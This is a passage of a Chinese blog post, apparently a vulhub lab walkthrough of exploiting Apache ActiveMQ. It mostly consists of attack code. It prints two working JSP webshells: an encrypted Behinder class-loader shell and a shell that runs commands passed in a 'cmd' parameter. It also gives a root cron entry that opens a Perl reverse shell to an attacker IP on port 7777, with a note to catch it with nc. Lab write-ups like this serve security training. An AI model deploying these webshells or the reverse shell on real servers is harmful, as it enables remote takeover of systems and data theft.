+<p><img src="https://img-blog.csdnimg.cn/62178b3707014be2a0e9ff4a2ef6c73d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="EXP1"><a href="#EXP1" class="headerlink" title="EXP1:"></a>EXP1:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035608.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035475.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035869.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>上传冰蝎马，之后不能利用，因为系统需要登录，无法直接利用，访问shell地址可以成功执行</p>
+<h3 id="EXP2："><a href="#EXP2：" class="headerlink" title="EXP2："></a>EXP2：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">out.print(&quot;Hello&lt;/br&gt;&quot;);</span><br><span class="line"> </span><br><span class="line">String strcmd=request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> </span><br><span class="line">String line=null;</span><br><span class="line"> </span><br><span class="line">Process p=Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> </span><br><span class="line">BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"> </span><br><span class="line">while((line=br.readLine())!=null)&#123;</span><br><span class="line"> </span><br><span class="line">  out.print(line+&quot;&lt;/br&gt;&quot;);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035198.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035455.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h3 id="写入计划任务"><a href="#写入计划任务" class="headerlink" title="写入计划任务"></a>写入计划任务</h3><p> 首先上传cron配置文件，返回状态码204表示成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * root /usr/bin/perl -e &#x27;use Socket;$i=&quot;反弹IP&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035403.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p> 将其移动到/etc/cron.d/root：</p>
+<p>成功移动后shell自动弹到反弹主机的7777端口，nc监听即可。</p>
+<p>这个方法需要ActiveMQ是root运行，否则也不能写入cron文件。</p>
+<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081035103.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>反弹成功~</p>
+<p><img src="https://img-blog.csdnimg.cn/96025a5455034e8fbef650bf4dd0139b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulhub%E6%BC%8F%E6%B4%9E/" rel="tag"># vulhub漏洞</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/12/08/vulhub%E6%BC%8F%E6%B4%9E%E2%80%94fastjson/" rel="prev" title="vulhub漏洞—fastjson">
+                  <i class="fa fa-chevron-left"></i> vulhub漏洞—fastjson
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/12/08/Burpsuite-Intruder%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/" rel="next" title="Burpsuite-Intruder功能详解">
+                  Burpsuite-Intruder功能详解 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ErYao7</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
